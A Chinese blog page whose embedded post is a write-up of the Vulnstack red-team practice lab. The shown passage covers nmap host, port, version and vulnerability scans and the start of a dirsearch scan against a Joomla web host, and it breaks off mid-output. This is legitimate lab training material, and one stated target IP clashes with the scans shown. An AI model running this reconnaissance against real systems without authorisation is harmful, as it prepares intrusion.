<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/b02d931ae848b785.css" as="style"/><link rel="stylesheet" href="/_next/static/css/b02d931ae848b785.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/oMFqh6VxQZoYSF5uQbT2C/_buildManifest.js" defer=""></script><script src="/_next/static/oMFqh6VxQZoYSF5uQbT2C/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(三)","contentHtml":"\u003ch1\u003eATT\u0026#x26;CK红队评估实战靶场(三)\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/5/\"\u003ehttp://vulnstack.qiyuanxuetang.net/vuln/detail/5/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e靶场搭建\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e修改仅主机网卡 A IP为\u003ccode\u003e192.168.93.0\u003c/code\u003e ，然后在添加一张仅主机网卡B，ip随意，我这里为\u003ccode\u003e192.168.213.0\u003c/code\u003e 网段\u003c/li\u003e\n\u003cli\u003eweb主机网卡内网设置网卡 A，出口网卡为网卡B\u003c/li\u003e\n\u003cli\u003e其余主机网卡都是仅主机网卡 A\u003c/li\u003e\n\u003cli\u003e内网测试，访问web主机服务是否正常\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003e目标：域控中存在一份重要文件。\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e扫描网段内存活主机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                                      \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.000072\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:08 (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00011\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00025\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:C9 (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.254\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00012\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:F1:A9:3F (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.129\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e根据靶机是我添加的最后一台靶机，所以靶机IP是\u003ccode\u003e156\u003c/code\u003e ，\u003ccode\u003ekali\u003c/code\u003e 的IP是\u003ccode\u003e150\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描靶机端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00057\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65532\u003c/span\u003e closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  mysql\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:C9 (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSSH\u003c/code\u003e，\u003ccode\u003eWEB\u003c/code\u003e，\u003ccode\u003eMYSQL\u003c/code\u003e端口\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sV -sT -O -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e                  \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00037\u003c/span\u003es latency).\n\nPORT     STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e5.3\u003c/span\u003e (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    nginx \u003cspan class=\"hljs-number\"\u003e1.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  mysql   MySQL \u003cspan class=\"hljs-number\"\u003e5.7\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27\u003c/span\u003e-0ubuntu0\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.04\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:C9 (VMware)\nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003eX\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.32\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e3.10\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务漏洞，使用\u003ccode\u003enmap\u003c/code\u003e扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e                                                                                                                                                               \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e CST                                                                                                                                                \nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e                                                                                                                                                                              \nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00049\u003c/span\u003es latency).                                                                                                                                                                                    \n                                                                                                                                                                                                                  \nPORT     STATE SERVICE                                                                                                                                                                                            \n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh                                                                                                                                                                                                \n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http                                                                                                                                                                                               \n               \n| http-dombased-xss:                                \n| Spidering limited to: maxdepth=\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e; maxpagecount=\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e; withinhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e                          \n|   Found the following indications of potential DOM based XSS:                                          \n|                                                   \n|     Source: window.\u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e(this.href,\u003cspan class=\"hljs-string\"\u003e'win2'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'\u003c/span\u003e)\n|_    Pages: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/, http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/, http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/, http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/, http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/index.php/\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e-welcome-to-your-blog, http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e                                        \n| http-enum:                                        \n|   /administrator/: Possible admin folder          \n|   /administrator/index.php: Possible admin folder                                                      \n|   /robots.txt: Robots file                        \n|   /administrator/manifests/files/joomla.xml: Joomla version \u003cspan class=\"hljs-number\"\u003e3.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e                                     \n|   /language/en-GB/en-GB.xml: Joomla version \u003cspan class=\"hljs-number\"\u003e3.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e                                                     \n|   /htaccess.txt: Joomla!                          \n|   /README.txt: Interesting, a readme.             \n|   /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/: Potentially interesting folder           \n|   /cache/: Potentially interesting folder         \n|   /images/: Potentially interesting folder        \n|   /includes/: Potentially interesting folder      \n|   /libraries/: Potentially interesting folder     \n|   /modules/: Potentially interesting folder       \n|   /templates/: Potentially interesting folder     \n|_  /tmp/: Potentially interesting folder           \n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  mysql                                \n|_mysql-vuln-cve2012-\u003cspan class=\"hljs-number\"\u003e2122\u003c/span\u003e: ERROR: Script execution failed (use -d to debug)                              \nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0C:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:C9 (VMware)             \n\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e75.86\u003c/span\u003e seconds \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e80\u003c/code\u003e端口枚举出很多路径，以及CMS估计是\u003ccode\u003eJoomla\u003c/code\u003e ，\u003ccode\u003e3306\u003c/code\u003e端口发现\u003ccode\u003ecve2012-2122\u003c/code\u003e ，但是脚本注入失败\u003c/p\u003e\n\u003cp\u003e优先级：\u003ccode\u003e80\u003c/code\u003e\u003e\u003ccode\u003e3306\u003c/code\u003e\u003e\u003ccode\u003e22\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eWEB渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页，网站指纹识别\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image39.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当前网站CMS是\u003ccode\u003eJoomla 3.9.12\u003c/code\u003e，\u003ccode\u003eNginx\u003c/code\u003e，并且是反向代理的\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描一下网站目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e -e php,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,html,txt                                                                                                             \n//                                                                                                             \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e] Starting:                                                                                         \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   24KB - /\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003ephp                                                                                                                                                      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  326B  - /administrator  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/administrator/                          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    2KB - /administrator/                                                                    \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  527B  - /administrator/includes/                                                           \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /administrator/cache/                                                              \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /administrator/logs/                                                               \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    2KB - /administrator/index.php                                                           \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  331B  - /administrator/logs  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/administrator/logs/                \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan 